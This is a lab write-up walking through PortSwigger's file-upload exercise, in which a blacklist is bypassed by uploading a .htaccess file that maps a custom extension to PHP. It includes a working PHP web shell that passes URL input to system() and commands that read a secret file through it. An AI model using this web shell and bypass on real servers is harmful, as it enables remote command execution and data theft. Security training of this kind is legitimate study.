## Welcome, my friend. Today we will start the [4. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) in ```portswigger```

# Explain this Scenario:

## The importance of verifying servers and the presence of a reverse proxy

### Realistic scenario:

#### Imagine that you exploit a vulnerability in a website and discover that your requests are being routed to a different back-end server by a ```reverse proxy```. You may need to know how each backend server is configured to ensure that your vulnerability will work across all of them.


-----------

## Inadequate blacklists of dangerous file types

### Realistic scenario:

####  If a blacklist only blocks the .php extension, you can try uploading a file with the ```.php5``` or ```.phtml``` extension, as in these cases the code may execute despite the apparent block.



----------


## Bypass server configuration

#### Server Configuration: Servers are usually configured to execute files only if they are configured to do so. For example, in an Apache server, it is configured to execute PHP files using certain directives such as:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```



#### Configuration override: Some servers allow creating directory-specific configuration files to override or add to the general settings. On Apache servers, a ```.htaccess file``` can be used to achieve this.

#### On ```IIS servers```, the ```web.config``` file can be used to configure specific directory settings.

### Exploiting configuration files: If your server allows you to upload a .htaccess or web.config file, you can attempt to set the file to assign a ```new MIME type``` to a non-traditional extension, which will lead to the malicious code being executed.




# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/1b7229a1-3813-48f9-b6f0-0dcc0d603e78)


#### Let's create a php malicious payload in file ```tor.php```:

### within tor.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)

### Now, Let's upload this malicious payload to server.


![image](https://github.com/user-attachments/assets/8d4d0ea0-7ab9-4ffd-9ab5-558f4ee71f14)

#### Hmm ,Sorry! REALY?

### ok Let's open the burp tool to explore what happen.


![image](https://github.com/user-attachments/assets/4ab7fbb3-ac22-4b18-bf2f-36f7ba0e38db)

### In bignner, We will uploading .htaccess file and change with configuration.
### change ```filename="tor.php"``` to ```filename=".htaccess"```
### change ```Content-Type: application/x-php``` to ```Content-Type: plain/text```
### ADD ```AddType application/x-httpd-php .hi``` instead of our payload.

![image](https://github.com/user-attachments/assets/ac4afcbe-6ff1-418a-b76e-acbc6b0d0b31)


#### Well, Let's change this ```Content-Type: application/x-php``` to ```Content-Type: image/jpeg```.

### Alsom, We change file name to ```tor.hi``` 


![image](https://github.com/user-attachments/assets/2f80a265-198a-4614-863f-45b0630756a4)

#### WOW! The file has been uploaded successfully.

### From Task 1, we explore that our file is within this path ```/files/avatars/file_name?parameter=command``` like this:

```
/files/avatars/tor.hi?tor=id
```

![image](https://github.com/user-attachments/assets/c25f3331-e8cf-4514-9453-816039c3c7f5)



#### Ok this task requrie reach to /home/carlos/secret file.

```
/files/avatars/tor.hi?tor=cat /home/carlos/secret
```

![image](https://github.com/user-attachments/assets/ab63ca56-fa23-4888-8574-b1daec98f9c3)


#### alert: this secret is douple, copy single secret only.
### Let's Submit this secret using the button provided in the lab banner.

## Then ...
